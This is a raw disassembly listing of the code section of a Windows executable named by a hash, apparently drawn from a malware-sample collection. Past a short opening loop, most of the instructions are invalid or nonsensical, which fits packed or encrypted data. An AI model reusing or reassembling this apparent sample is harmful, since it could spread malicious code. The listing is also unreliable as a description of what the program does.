
d2b24f78fc4489ad9cf72650903082d103197bc79cba69333b93aab744963ffc.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x426ae2
  40100e:	mov    DWORD PTR ds:0x42a37d,0x1b
  401018:	cmp    DWORD PTR ds:0x42a37d,0x0
  40101f:	je     0x40155e
  401025:	cmp    DWORD PTR ds:0x42a37d,0x23
  40102c:	jne    0x40103b
  401032:	push   DWORD PTR [ebp-0x14]
  401035:	call   DWORD PTR ds:0x42501c
  40103b:	mov    ecx,DWORD PTR ds:0x42a37d
  401041:	dec    ecx
  401042:	mov    DWORD PTR ds:0x42a37d,ecx
  401048:	jmp    0x401018
  40104d:	or     DWORD PTR ds:0x42a405,ebx
  401053:	jmp    0x40155e
  401058:	int    0x3c
  40105a:	sar    DWORD PTR ds:0xccd1cdd1,1
  401060:	(bad)  
  401061:	push   eax
  401063:	sbb    al,0xc1
  401065:	jle    0x4010b1
  401067:	dec    esi
  401068:	js     0x4010e2
  40106a:	js     0x4010e4
  40106c:	push   0x7c
  40106e:	js     0x4010e8
  401070:	enter  0x3dd7,0xd5
  401074:	rcr    ebx,0xcf
  401077:	fld    st(4)
  401079:	pop    es
  40107a:	push   es
  40107b:	or     ecx,DWORD PTR [ebx]
  40107d:	scas   eax,DWORD PTR es:[edi]
  40107e:	or     cl,BYTE PTR [edi]
  401080:	cmp    ecx,DWORD PTR [edi]
  401082:	retf   0xc722
  401085:	sbb    bl,BYTE PTR [edi]
  401087:	inc    ecx
  401088:	bound  ecx,QWORD PTR [edx]
  40108a:	mov    bh,0xdd
  40108c:	or     bh,ch
  40108e:	mov    ebp,0x880bd0e3
  401093:	and    BYTE PTR [eax+0x1549a4f6],bh
  401099:	lods   eax,DWORD PTR ds:[esi]
  40109a:	fadd   DWORD PTR [eax+0x1f]
  40109d:	pusha  
  40109e:	out    dx,al
  40109f:	outs   dx,DWORD PTR ds:[esi]
  4010a0:	adc    ebx,DWORD PTR [ecx]
  4010a2:	sahf   
  4010a3:	add    dl,al
  4010a5:	dec    edx
  4010a6:	lods   al,BYTE PTR ds:[esi]
  4010a7:	pop    ebx
  4010a8:	sub    eax,0xad3ec6d9
  4010ad:	mov    WORD PTR [ebx],es
  4010af:	lds    esi,FWORD PTR [ebx-0x76243a00]
  4010b5:	adc    eax,0x3af3c19a
  4010bb:	xchg   ebx,eax
  4010bc:	icebp  
  4010bd:	dec    edi
  4010be:	loopne 0x401060
  4010c0:	dec    ecx
  4010c1:	call   DWORD PTR [edi-0x234ef85e]
  4010c7:	mov    ebp,0x5530ed4d
  4010cc:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  4010d3:	sbb    ebx,ecx
  4010d5:	xchg   esp,eax
  4010d6:	sub    esi,edx
  4010d8:	repz pop eax
  4010da:	(bad)  
  4010db:	out    0x42,al
  4010dd:	cli    
  4010de:	in     al,dx
  4010df:	xchg   esp,eax
  4010e0:	cmp    edi,ecx
  4010e2:	jbe    0x401149
  4010e4:	xlat   BYTE PTR ds:[ebx]
  4010e5:	sub    cl,ch
  4010e7:	add    al,0xe1
  4010e9:	sbb    DWORD PTR [ecx-0x60],ebx
  4010ec:	xor    eax,0x2696f0b
  4010f1:	adc    bh,BYTE PTR [ecx]
  4010f3:	fisttp QWORD PTR [eax+0x7f753256]
  4010f9:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010ff:	arpl   WORD PTR [ebp-0x23],dx
  401102:	rcl    BYTE PTR [ecx],1
  401104:	fistp  DWORD PTR [esi-0x1f]
  401107:	and    DWORD PTR [ecx-0x68],edi
  40110a:	inc    eax
  40110b:	push   ebx
  40110c:	aaa    
  40110d:	adc    eax,0x1c317733
  401112:	fstp   TBYTE PTR [eax]
  401114:	dec    edi
  401115:	repnz into 
  401117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401118:	mov    bh,0x81
  40111a:	pop    ebx
  40111b:	jbe    0x401164
  40111d:	pusha  
  40111e:	mov    ds:0x509d31a3,al
  401123:	out    dx,al
  401124:	sbb    al,0xc7
  401127:	enter  0xc68b,0x3a
  40112b:	retf   0x88a3
  40112e:	sbb    esi,ebp
  401130:	and    DWORD PTR [ebx],eax
  401132:	subps  xmm4,XMMWORD PTR [edi-0x59561796]
  401139:	(bad)  
  40113a:	mov    al,ds:0xd541d320
  40113f:	adc    esi,0xfffffffb
  401142:	inc    edi
  401143:	and    al,0x47
  401145:	clc    
  401146:	mov    esp,0x3eb0da8f
  40114b:	lods   al,BYTE PTR es:[esi]
  40114d:	dec    eax
  40114e:	lods   eax,DWORD PTR ds:[esi]
  40114f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401150:	cmp    al,0x9b
  401152:	push   ebp
  401153:	stos   BYTE PTR es:[edi],al
  401154:	jmp    0x2de1:0x18ff4d7c
  40115b:	aas    
  40115c:	or     edx,ebp
  40115e:	cmp    DWORD PTR [esi+eax*2+0x2b6d1839],ebx
  401165:	aam    0x5d
  401167:	mov    dl,BYTE PTR [ebx+0x8]
  40116a:	test   al,ah
  40116c:	jg     0x40111f
  40116e:	xchg   ebx,eax
  40116f:	aaa    
  401170:	js     0x401108
  401172:	or     DWORD PTR [ebx+ebp*2+0x31],0x665ac365
  40117a:	(bad)  
  40117d:	fist   DWORD PTR [esi]
  40117f:	and    ah,BYTE PTR [esi-0x1b]
  401182:	mov    esp,0x3dd0f62b
  401187:	cwde   
  401188:	daa    
  401189:	jns    0x401145
  40118b:	add    esi,0x846ac8e8
  401191:	mov    ?,WORD PTR [eax]
  401193:	push   edi
  401194:	outs   dx,BYTE PTR ds:[esi]
  401195:	or     DWORD PTR ds:0x4d3ca1fd,ecx
  40119b:	and    bh,BYTE PTR [edx-0xc]
  40119e:	mov    eax,0x75a57eb4
  4011a3:	xor    eax,0xe9b8af85
  4011a8:	xor    eax,0x160f82a1
  4011ad:	out    dx,al
  4011ae:	mov    edx,0x3929c01e
  4011b3:	mov    edi,0x8da9b303
  4011b8:	stos   DWORD PTR es:[edi],eax
  4011b9:	or     DWORD PTR [eax],ebx
  4011bb:	push   ebx
  4011bc:	je     0x401180
  4011be:	mov    dh,0xbd
  4011c0:	and    ch,cl
  4011c2:	imul   edx,DWORD PTR [edx+0x13],0xffffff86
  4011c6:	stos   DWORD PTR es:[edi],eax
  4011c7:	sbb    al,0x9f
  4011c9:	ss or  eax,0x3e8e1d12
  4011cf:	cld    
  4011d0:	xchg   ebx,eax
  4011d1:	sti    
  4011d2:	ret    0xdbf4
  4011d5:	xchg   ebx,esp
  4011d7:	and    al,0x5e
  4011d9:	mov    ah,bl
  4011db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011dc:	inc    ebp
  4011dd:	push   ss
  4011de:	sub    esi,DWORD PTR ds:0x845cffa3
  4011e4:	cwde   
  4011e5:	or     DWORD PTR [ebx-0x4d],edx
  4011e8:	jle    0x401256
  4011ea:	inc    ebx
  4011eb:	daa    
  4011ec:	jne    0x4011e6
  4011ee:	retf   
  4011ef:	popf   
  4011f0:	mov    ebp,ss
  4011f2:	ret    0xb2a3
  4011f5:	add    al,0x5a
  4011f7:	rol    DWORD PTR [ecx*8-0x536929f3],1
  4011fe:	add    esi,ebx
  401200:	inc    edi
  401201:	pop    edi
  401202:	dec    edi
  401203:	jle    0x4011b7
  401205:	mov    edx,0x9286c5c7
  40120a:	inc    ecx
  40120b:	mov    edx,0x7b2c3329
  401210:	pusha  
  401211:	jb     0x40126f
  401213:	mov    ch,0x7f
  401215:	ins    DWORD PTR es:[edi],dx
  401216:	mov    ?,WORD PTR ds:[ecx]
  401219:	or     eax,0xf927af8c
  40121e:	push   es
  40121f:	test   bl,cl
  401221:	adc    eax,0x91b970c2
  401226:	push   es
  401227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401228:	inc    edx
  401229:	mov    esp,0xae094896
  40122e:	push   edx
  40122f:	pop    eax
  401230:	inc    ebp
  401231:	ret    
  401232:	loop   0x4011ce
  401234:	sbb    ecx,DWORD PTR [esi+0xf]
  401237:	fidiv  DWORD PTR ds:0xf82bd253
  40123d:	test   BYTE PTR [eax-0x63],dl
  401240:	mov    ebp,0x5965bf39
  401245:	cmp    BYTE PTR [ecx+edi*8-0x4c],ch
  401249:	mov    ebp,0x44377c85
  40124e:	sbb    eax,0xca10af32
  401253:	jmp    0x4012a3
  401255:	inc    ebx
  401256:	retf   
  401257:	mov    bh,0xf7
  401259:	jp     0x4012a6
  40125b:	pop    ss
  40125c:	inc    edi
  40125d:	push   cs
  40125e:	add    BYTE PTR [edi+0x21],al
  401261:	or     eax,0x4fb3dbc
  401266:	mov    ebp,0xe848cdbf
  40126b:	fst    DWORD PTR [ebp+0x132bf207]
  401271:	pop    ebp
  401272:	push   ebx
  401273:	mov    ecx,0xc718a77a
  401278:	xor    al,0x12
  40127a:	clc    
  40127b:	dec    ebx
  40127c:	push   0x61e1fa81
  401281:	rcr    DWORD PTR [ebx+ebp*2-0x3f],0xd0
  401286:	mov    ebx,0x72699f3a
  40128b:	jmp    0x99582064
  401290:	xor    esi,ebx
  401292:	call   0xf0cc:0x49c04dff
  401299:	sbb    esp,DWORD PTR [eax-0xc54ceef]
  40129f:	push   ecx
  4012a0:	xchg   edi,eax
  4012a1:	stos   BYTE PTR es:[edi],al
  4012a2:	pop    es
  4012a3:	test   BYTE PTR [esi+0x5760ba80],dh
  4012a9:	cmp    al,0x2c
  4012ab:	test   DWORD PTR [edi+0x10],0xd73d703d
  4012b2:	inc    ebp
  4012b3:	shr    BYTE PTR [eax],cl
  4012b5:	jmp    0xd027:0xaccfc9a0
  4012bc:	adc    dl,BYTE PTR [esi+0x6a]
  4012bf:	and    eax,0x6020e867
  4012c4:	out    0x8e,al
  4012c6:	mov    esp,0xd6643f43
  4012cb:	fimul  DWORD PTR [ebp+0x6]
  4012ce:	in     eax,0xf5
  4012d0:	push   ecx
  4012d1:	pop    edx
  4012d2:	sub    al,0xa8
  4012d4:	scas   eax,DWORD PTR es:[edi]
  4012d5:	loopne 0x401265
  4012d7:	and    ah,BYTE PTR [edi-0x66]
  4012da:	add    al,0x47
  4012dc:	ins    BYTE PTR es:[edi],dx
  4012dd:	jecxz  0x40132b
  4012df:	inc    edi
  4012e0:	push   ebp
  4012e1:	(bad)  
  4012e2:	lahf   
  4012e3:	xchg   BYTE PTR ds:0x318a9dc8,al
  4012e9:	imul   edi,esp,0x7f
  4012ec:	push   esi
  4012ed:	aaa    
  4012ee:	add    DWORD PTR [edi+0x11],ecx
  4012f1:	cmp    BYTE PTR [ebp-0x4b],bl
  4012f4:	lock sti 
  4012f6:	adc    DWORD PTR ds:0xd12cb4c3,ecx
  4012fd:	and    edx,DWORD PTR [ebx+eax*8]
  401300:	mov    BYTE PTR [edi],0xc8
  401303:	test   eax,0x6c1b3100
  401308:	and    DWORD PTR [eax],ebp
  40130a:	mov    ecx,0x75aad6cc
  40130f:	lods   eax,DWORD PTR ds:[esi]
  401310:	dec    eax
  401311:	dec    esp
  401312:	imul   eax,DWORD PTR [eax],0xf5bd84ac
  401318:	fisub  WORD PTR [edx]
  40131a:	lods   al,BYTE PTR ds:[esi]
  40131b:	pop    edi
  40131c:	push   edx
  40131d:	cwde   
  40131e:	jne    0x40137c
  401320:	dec    ebp
  401321:	cmp    eax,0x54961ad0
  401326:	push   0x54978e7e
  40132b:	cli    
  40132c:	stos   DWORD PTR es:[edi],eax
  40132d:	sub    al,0xf6
  40132f:	cli    
  401330:	jns    0x40137d
  401332:	push   ebp
  401333:	retf   0xbbc7
  401336:	mov    bl,0x5f
  401338:	mov    ch,0xf9
  40133a:	nop
  40133b:	add    BYTE PTR [edi-0x9],0x63
  40133f:	push   ebp
  401340:	rcr    DWORD PTR [ebp+0x2],cl
  401343:	cwde   
  401344:	pop    ss
  401345:	mov    WORD PTR ds:[ebx+0x34],fs
  401349:	xchg   BYTE PTR [eax-0x4c],ah
  40134c:	jbe    0x401308
  40134e:	pop    esp
  40134f:	jmp    0x60ffca0c
  401354:	sub    eax,0x6fcee005
  401359:	dec    edi
  40135a:	fisttp DWORD PTR ds:0x5089be41
  401360:	outs   dx,BYTE PTR ds:[esi]
  401361:	cdq    
  401362:	jne    0x401351
  401364:	push   esi
  401365:	push   ds
  401366:	sbb    bl,bh
  401368:	sub    eax,0xe74b86c2
  40136d:	les    esp,FWORD PTR [ebp-0x18e62074]
  401373:	mov    ebp,0x5d59b972
  401378:	pop    eax
  401379:	add    bl,dh
  40137b:	and    eax,0xd6b286f
  401380:	xor    al,0xa0
  401382:	pop    esp
  401383:	fisubr WORD PTR es:[ecx+0x19]
  401387:	adc    DWORD PTR [ecx-0x5cb121e1],esp
  40138d:	jge    0x4013c5
  40138f:	inc    edi
  401390:	jg     0x401356
  401392:	sti    
  401393:	addr16 sti 
  401395:	jmp    0x17622e51
  40139a:	cmp    BYTE PTR [esi],ah
  40139c:	mov    ah,0x9c
  40139e:	dec    edi
  40139f:	repnz in al,dx
  4013a1:	mov    cl,0xa
  4013a3:	adc    eax,0x51008a71
  4013a8:	retf   0x60b0
  4013ab:	fwait
  4013ac:	test   al,0x7
  4013ae:	xchg   ebx,ebx
  4013b0:	mov    edi,0x24319613
  4013b5:	retf   0xbf9e
  4013b8:	push   ebx
  4013b9:	xor    cl,dl
  4013bb:	mov    al,BYTE PTR [eax+0x49]
  4013be:	xor    cl,BYTE PTR [eax]
  4013c0:	ins    DWORD PTR es:[edi],dx
  4013c1:	sbb    ch,cl
  4013c3:	outs   dx,BYTE PTR ds:[esi]
  4013c4:	push   0x1488f770
  4013c9:	sub    ch,BYTE PTR [edx+0x492aa791]
  4013cf:	lock dec edi
  4013d1:	sbb    cl,0x1e
  4013d4:	popf   
  4013d5:	mov    al,0x10
  4013d7:	dec    esi
  4013d8:	sti    
  4013d9:	in     eax,dx
  4013da:	push   0xffffffe6
  4013dc:	arpl   WORD PTR [ebp+0x5ceb86bc],bp
  4013e2:	push   eax
  4013e3:	(bad)  
  4013e4:	mov    ds:0x48e3360d,eax
  4013e9:	fistp  WORD PTR [eax+0x58]
  4013ec:	ja     0x401408
  4013ee:	mov    WORD PTR [eax],ds
  4013f0:	jecxz  0x401455
  4013f2:	jb     0x401408
  4013f4:	outs   dx,DWORD PTR ds:[esi]
  4013f5:	bound  edi,QWORD PTR [eax+0x57943378]
  4013fb:	stc    
  4013fc:	sar    DWORD PTR [esi+0x27ebe84d],cl
  401402:	xchg   edi,eax
  401403:	pop    ecx
  401404:	cmp    BYTE PTR [eax+0xe],ah
  401407:	jnp    0x401437
  401409:	pop    edi
  40140a:	mul    dh
  40140c:	mov    ebp,0xb38bcd3a
  401411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401412:	mov    bl,0xdc
  401414:	mov    ah,0x1d
  401416:	test   ebp,ecx
  401418:	pand   mm2,QWORD PTR [ecx]
  40141b:	enter  0xc74c,0x47
  40141f:	add    cl,BYTE PTR [esi-0x77]
  401422:	lahf   
  401423:	jmp    0xf96507d9
  401428:	add    BYTE PTR [ebx+0x6dfde06a],dh
  40142e:	xlat   BYTE PTR ds:[ebx]
  40142f:	out    dx,eax
  401430:	imul   edx,ecx,0xf
  401433:	pop    edx
  401434:	dec    si
  401436:	fs aad 0x51
  401439:	sub    BYTE PTR [edx+eiz*2+0x66],dl
  40143d:	outs   dx,BYTE PTR ds:[esi]
  40143e:	(bad)  
  40143f:	fcomp  QWORD PTR [esi+0x10]
  401442:	call   0x40f930e
  401447:	retf   0x293a
  40144a:	daa    
  40144b:	test   al,0x5e
  40144d:	cdq    
  40144e:	push   ebx
  40144f:	ins    DWORD PTR es:[edi],dx
  401450:	or     DWORD PTR [edx],esi
  401452:	shr    DWORD PTR [esi+edi*8-0x68],0xe2
  401457:	push   ebp
  401458:	push   cs
  401459:	out    dx,eax
  40145a:	das    
  40145b:	sbb    esi,DWORD PTR [ecx+edi*2+0x20650a5e]
  401462:	test   al,0xef
  401464:	rcl    DWORD PTR [ebp-0x5b831ba9],1
  40146a:	xor    ecx,edi
  40146c:	pop    ss
  40146d:	in     eax,0x9
  40146f:	jmp    0x4014bc
  401471:	push   0xffffffb9
  401473:	(bad)  
  401474:	fstp   TBYTE PTR [eax+0x20]
  401477:	les    ebx,FWORD PTR ds:0x874d6634
  40147d:	sbb    BYTE PTR [esi-0x2c38c1b5],bh
  401483:	enter  0xc7f4,0x68
  401487:	(bad)  
  401488:	ins    DWORD PTR es:[edi],dx
  401489:	cmp    eax,0x7a2ea053
  40148e:	arpl   ax,si
  401490:	outs   dx,BYTE PTR ds:[esi]
  401491:	jecxz  0x401481
  401493:	(bad)
  401497:	mov    gs,WORD PTR ds:0x15d2a530
  40149d:	add    eax,0xc5b803ac
  4014a2:	(bad)  
  4014a3:	jae    0x40146f
  4014a5:	out    0x98,al
  4014a7:	xchg   ebp,eax
  4014a8:	movlps xmm3,QWORD PTR [ecx-0x71]
  4014ac:	sbb    DWORD PTR [eax],eax
  4014ae:	in     eax,0x31
  4014b0:	or     al,0xb8
  4014b2:	push   edx
  4014b3:	ret    
  4014b4:	mov    dh,0xfc
  4014b6:	dec    edx
  4014b7:	out    dx,eax
  4014b8:	add    DWORD PTR [esi-0x45],0xe69b1351
  4014bf:	xchg   ebx,eax
  4014c0:	cmp    esp,DWORD PTR [ebp-0x3c]
  4014c3:	cld    
  4014c4:	sub    eax,esi
  4014c6:	fwait
  4014c7:	not    DWORD PTR [ebx]
  4014c9:	jo     0x4014fe
  4014cb:	lds    ecx,FWORD PTR [ebx+edx*4-0x5b]
  4014cf:	xor    ebx,esp
  4014d1:	dec    edi
  4014d2:	out    0x16,eax
  4014d4:	scas   eax,DWORD PTR es:[edi]
  4014d5:	push   edi
  4014d6:	xadd   DWORD PTR [ecx-0x75],esp
  4014da:	ret    0xead4
  4014dd:	sub    DWORD PTR [edi],esp
  4014df:	ins    DWORD PTR es:[edi],dx
  4014e0:	repz (bad) 
  4014e2:	mov    ecx,0xb5a2355d
  4014e7:	xchg   esp,eax
  4014e8:	jne    0x40146c
  4014ea:	mov    BYTE PTR [esi+0x6723b800],ch
  4014f0:	sub    eax,0xaeee8ff9
  4014f5:	sbb    DWORD PTR [edx],ebp
  4014f7:	add    cl,BYTE PTR [ecx+0x44]
  4014fa:	add    al,dh
  4014fc:	jmp    0x46bba04c
  401501:	mov    eax,0xd1fd9806
  401506:	in     eax,0xe7
  401508:	cmp    dh,dh
  40150a:	daa    
  40150b:	jle    0x4014e5
  40150d:	jmp    0x6643:0xcc9a7afb
  401514:	xchg   edi,eax
  401515:	dec    ebp
  401516:	sub    eax,0xa39ca0e
  40151b:	push   cs
  40151c:	aaa    
  40151d:	fisttp QWORD PTR [edx]
  40151f:	mov    ds:0x88f7c76f,eax
  401524:	sbb    BYTE PTR [esi-0xe],ch
  401527:	push   esp
  401528:	xchg   esp,eax
  401529:	repnz sbb BYTE PTR ds:0xc36e4ab3,ah
  401530:	dec    ebx
  401531:	mov    bh,0xad
  401533:	lods   al,BYTE PTR ds:[esi]
  401534:	sub    eax,0xcca1dbb0
  401539:	inc    edi
  40153a:	test   bh,bl
  40153c:	rol    DWORD PTR [edi],cl
  40153e:	loope  0x401533
  401540:	add    bl,BYTE PTR [edi]
  401542:	imul   DWORD PTR [ecx-0x25292ee9]
  401548:	adc    esp,0xffffffae
  40154b:	sbb    eax,0xd8528f60
  401550:	push   ecx
  401551:	js     0x401587
  401553:	out    0xe7,eax
  401555:	xchg   edx,eax
  401556:	popf   
  401557:	jbe    0x4015d5
  401559:	shl    BYTE PTR [edi],0x24
  40155c:	pusha  
  40155d:	xor    eax,0xa1e84589
  401562:	repnz imul eax,DWORD PTR [edx+0x0],0xffffff89
  401567:	inc    ebp
  401568:	mov    eax,0xa40d1519
  40156d:	inc    edx
  40156e:	add    bh,al
  401570:	inc    ebp
  401571:	lock cmp BYTE PTR [ebp+0x45c7f89c],al
  401578:	in     al,0x39
  40157a:	test   DWORD PTR [eax+edi*8-0x5c4ef275],ebx
  401581:	inc    edx
  401582:	add    BYTE PTR [ecx],dh
  401584:	or     eax,0x42a3bd
  401589:	mov    eax,DWORD PTR [ebp-0x10]
  40158c:	and    DWORD PTR ds:0x42a2e1,0x692a
  401596:	push   ebx
  401597:	sub    ecx,ecx
  401599:	jmp    0x401aa4
  40159e:	enter  0xc8d0,0xd7
  4015a2:	rcl    bh,1
  4015a4:	xlat   BYTE PTR ds:[ebx]
  4015a5:	xlat   BYTE PTR ds:[ebx]
  4015a6:	dec    ebx
  4015a7:	xor    BYTE PTR [edi],bl
  4015a9:	pop    esi
  4015aa:	mov    BYTE PTR [ecx+0x7c6a5c7c],cl
  4015b0:	js     0x40162a
  4015b2:	push   0x7c
  4015b4:	js     0x40162e
  4015b6:	out    dx,eax
  4015b7:	push   ds
  4015b8:	jne    0x4015bf
  4015ba:	fcomp  QWORD PTR [ebp+0x2b]
  4015bd:	rcr    DWORD PTR [esi+0x76],0xb2
  4015c1:	fidivr WORD PTR [ecx]
  4015c3:	sahf   
  4015c4:	cmp    edi,DWORD PTR [edx]
  4015c6:	mov    esi,0x7c0642d9
  4015cb:	push   ds
  4015cc:	arpl   di,cx
  4015ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015cf:	jg     0x40163a
  4015d1:	push   cs
  4015d2:	arpl   WORD PTR [ebx],dx
  4015d4:	dec    ebx
  4015d5:	cmp    edi,ecx
  4015d7:	aam    0xf4
  4015d9:	cmp    edi,DWORD PTR [ebx+0x2c]
  4015dc:	xchg   esi,eax
  4015dd:	or     eax,0xdc56f97
  4015e2:	idiv   DWORD PTR [eax-0x17]
  4015e5:	xor    dl,BYTE PTR [edx]
  4015e7:	fwait
  4015e8:	or     BYTE PTR [ecx-0x5f],0xcf
  4015ec:	out    dx,eax
  4015ed:	in     al,0x94
  4015ef:	and    eax,0x422951ae
  4015f4:	(bad)  
  4015f5:	iret   
  4015f6:	and    al,0x7c
  4015f8:	push   edx
  4015f9:	xlat   BYTE PTR ds:[ebx]
  4015fa:	mov    esi,0x41200e73
  4015ff:	sbb    DWORD PTR [edi+0x77c88a87],edi
  401605:	fs inc ecx
  401607:	ret    0x7507
  40160a:	in     eax,0x86
  40160c:	jnp    0x401661
  40160e:	inc    esi
  40160f:	scas   eax,DWORD PTR es:[edi]
  401610:	mov    al,0x80
  401612:	sbb    DWORD PTR [edi+0x6a],ebp
  401615:	into   
  401616:	sbb    DWORD PTR [esi],ebx
  401618:	nop
  401619:	enter  0xcfde,0x4d
  40161d:	dec    ebp
  40161e:	mov    ds:0xf3232cdf,al
  401623:	ret    
  401624:	arpl   WORD PTR [ebp+0x55e391c2],sp
  40162a:	enter  0x678d,0x5d
  40162e:	cmp    cl,0xc3
  401631:	lods   al,BYTE PTR ds:[esi]
  401632:	sti    
  401633:	or     esi,DWORD PTR [esi-0x18]
  401636:	or     BYTE PTR [ebx],bh
  401638:	mov    ch,0xcb
  40163a:	cld    
  40163b:	arpl   WORD PTR [ebp+0x5],bp
  40163e:	mov    ecx,0x2b33ba41
  401643:	or     al,0xf8
  401645:	aam    0xea
  401647:	dec    edi
  401648:	lea    edi,[edx+ebp*2]
  40164b:	daa    
  40164c:	mov    eax,ds:0x7691fc0f
  401651:	inc    edx
  401652:	mov    ah,0x5d
  401654:	push   edi
  401655:	outs   dx,BYTE PTR ds:[esi]
  401656:	lock lea esi,ds:0xbd872c95
  40165d:	into   
  40165e:	ret    
  40165f:	daa    
  401660:	loope  0x4016c6
  401662:	xchg   ecx,eax
  401663:	icebp  
  401664:	push   esp
  401665:	jbe    0x28d54ac3
  40166b:	fnstsw WORD PTR [ebx-0x4ec3f604]
  401671:	sub    bh,BYTE PTR [ebx-0x6b43e209]
  401677:	pop    esi
  401678:	les    edx,FWORD PTR [edi-0x7df1c541]
  40167e:	nop
  40167f:	sub    BYTE PTR [edi+edi*4+0x2d],bh
  401683:	xchg   edx,eax
  401684:	nop
  401685:	div    DWORD PTR ds:0x3a9c7720
  40168b:	jo     0x401664
  40168d:	in     eax,dx
  40168e:	add    BYTE PTR [ecx+0x22d346c2],cl
  401694:	je     0x401691
  401696:	stc    
  401697:	sti    
  401698:	mov    BYTE PTR ds:0xcfbe4f64,0xe9
  40169f:	push   ecx
  4016a0:	aad    0x6a
  4016a2:	jne    0x4016e0
  4016a4:	and    DWORD PTR [eax+edx*2+0x5b50b747],esp
  4016ab:	(bad)  
  4016ac:	cmp    al,BYTE PTR [edi-0x26]
  4016af:	mov    edi,DWORD PTR [ebx]
  4016b1:	sub    DWORD PTR [ebp-0x6],eax
  4016b4:	lds    ecx,FWORD PTR [ebx-0x765f1aca]
  4016ba:	enter  0x74db,0x24
  4016be:	int    0xc4
  4016c0:	mov    ch,0x2d
  4016c2:	lock int 0xd7
  4016c5:	sub    al,BYTE PTR ds:0x8a4ffab2
  4016cb:	in     al,0xe3
  4016cd:	jne    0x4016de
  4016cf:	xlat   BYTE PTR ds:[ebx]
  4016d0:	dec    esp
  4016d1:	pop    ds
  4016d2:	or     edi,DWORD PTR es:[edx+edi*8+0x30781265]
  4016da:	mov    ch,0x81
  4016dc:	fld    QWORD PTR [esi+ecx*2+0x410a0edf]
  4016e3:	sub    al,0xd8
  4016e5:	fdiv   QWORD PTR [edx-0x5d]
  4016e8:	out    dx,al
  4016e9:	mov    dl,0x6d
  4016eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ec:	lock sbb al,bl
  4016ef:	aas    
  4016f0:	inc    esp
  4016f1:	adc    bl,BYTE PTR [esi-0x38c25f83]
  4016f7:	test   DWORD PTR [ebx-0x130d7efa],esi
  4016fd:	idiv   BYTE PTR [ecx]
  4016ff:	pop    ebx
  401700:	pop    esi
  401701:	xor    eax,0x34fd9912
  401706:	ror    DWORD PTR [eax],1
  401708:	mov    dl,BYTE PTR [edi]
  40170a:	std    
  40170b:	jecxz  0x4016f8
  40170d:	into   
  40170e:	shr    DWORD PTR [ecx],1
  401710:	inc    eax
  401711:	sbb    esp,edi
  401713:	jg     0x4016f6
  401715:	lds    esp,FWORD PTR [eax+0x23]
  401718:	dec    ecx
  401719:	dec    ebp
  40171a:	out    dx,al
  40171b:	push   0xbac87738
  401720:	inc    ebx
  401721:	(bad)  
  401723:	aas    
  401724:	xchg   ecx,eax
  401725:	(bad)  
  401726:	jecxz  0x401742
  401728:	call   0x92463247
  40172d:	xchg   edx,eax
  40172e:	mov    esp,DWORD PTR [esi+edi*8]
  401731:	add    al,0x9b
  401733:	cmp    eax,0x814a21ef
  401738:	sub    eax,0xb2985f0c
  40173d:	cmp    ebp,DWORD PTR [edi]
  40173f:	retf   
  401740:	push   0xea85b689
  401745:	pop    esi
  401746:	leave  
  401747:	pop    edx
  401748:	out    0x5d,al
  40174a:	lock cmp al,0x5c
  40174d:	mov    edx,0xaba87fe1
  401752:	mov    al,BYTE PTR [edx+0x74]
  401755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401756:	mov    eax,ds:0x9a0bfb52
  40175b:	jle    0x401721
  40175d:	aas    
  40175e:	xchg   edi,eax
  40175f:	out    0x36,al
  401761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401762:	xchg   DWORD PTR [ebp-0x74339fd9],edx
  401768:	outs   dx,BYTE PTR ds:[esi]
  401769:	hlt    
  40176a:	cwde   
  40176b:	rep stos BYTE PTR es:[edi],al
  40176d:	mov    ds:0xf580c13f,eax
  401772:	loope  0x401708
  401774:	cmp    al,bl
  401776:	stos   BYTE PTR es:[edi],al
  401777:	out    0xb7,eax
  401779:	dec    ebp
  40177a:	cmp    ch,dh
  40177c:	shl    DWORD PTR [esi+0x1f],cl
  40177f:	cdq    
  401780:	mov    ds:0x2bcd3c35,eax
  401785:	lahf   
  401786:	sbb    eax,0x63a50c30
  40178b:	pop    ss
  40178c:	scas   eax,DWORD PTR es:[edi]
  40178d:	dec    ebp
  40178e:	bound  ebp,QWORD PTR [ebp-0x3e]
  401791:	xor    bl,BYTE PTR [esi-0x79]
  401794:	neg    BYTE PTR [ebx]
  401796:	nop
  401797:	push   es
  401798:	dec    eax
  401799:	mov    ch,0x96
  40179b:	sbb    DWORD PTR [edi-0x163a83b7],0x7a
  4017a2:	and    BYTE PTR [esi+0x1c],0xe2
  4017a6:	jnp    0x40175a
  4017a8:	dec    esi
  4017a9:	pop    ebx
  4017aa:	stos   DWORD PTR es:[edi],eax
  4017ab:	cmp    ecx,eax
  4017ad:	lea    esi,[ebx-0x5bf1ec5d]
  4017b3:	and    ecx,ebp
  4017b5:	jbe    0x401741
  4017b7:	cmp    eax,0x6e600edc
  4017bc:	(bad)  
  4017bd:	inc    edi
  4017be:	aaa    
  4017bf:	(bad)  
  4017c0:	int3   
  4017c1:	sub    eax,0xf37c1aa4
  4017c6:	xor    ebp,DWORD PTR [ebx+0x5362f7bf]
  4017cc:	addr16 popf 
  4017ce:	in     eax,dx
  4017cf:	xlat   BYTE PTR ds:[ebx]
  4017d0:	add    esp,DWORD PTR [ebx]
  4017d2:	fcomip st,st(6)
  4017d4:	stc    
  4017d5:	dec    edi
  4017d6:	fucom  st(0)
  4017d8:	dec    esi
  4017d9:	jb     0x40179c
  4017db:	add    al,BYTE PTR [edi+0x6f02cb35]
  4017e1:	leave  
  4017e2:	std    
  4017e3:	in     eax,0xc0
  4017e5:	test   al,0xd7
  4017e7:	scas   eax,DWORD PTR es:[edi]
  4017e8:	jne    0x401863
  4017ea:	pushf  
  4017eb:	dec    esi
  4017ec:	iret   
  4017ed:	fsubr  DWORD PTR [esi]
